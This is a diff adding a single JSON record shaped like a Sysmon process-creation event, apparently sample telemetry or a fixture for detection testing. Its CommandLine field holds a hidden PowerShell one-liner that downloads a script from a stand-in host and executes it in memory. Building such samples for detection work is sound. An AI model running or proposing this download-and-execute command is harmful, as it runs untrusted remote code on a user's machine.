@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-03 12:00:05.000",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "Image": "C:\\Windows\\System32\\cmd.exe",
+  "CommandLine": "cmd.exe /c start /b powershell.exe -w hidden -c irm https://lure.invalid/test | iex",
+  "User": "VICTIM-PC\\analyst"
+}
